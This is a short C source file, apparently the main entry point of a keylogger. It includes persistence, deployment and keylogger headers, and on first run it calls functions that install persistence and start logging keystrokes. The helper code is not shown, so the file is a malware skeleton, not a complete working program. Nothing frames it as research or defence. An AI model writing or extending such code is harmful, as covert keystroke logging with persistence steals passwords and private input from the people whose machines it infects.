#include "persist.h"
#include "deploy.h"
#include "keylogger.h"
#include <stdio.h>

int main(int argc, char *argv[]){
	bool hasRun = argc > 1;
	deploy(hasRun);
	if(!hasRun){
		addPersistence();
		beginLogging();
	}
}
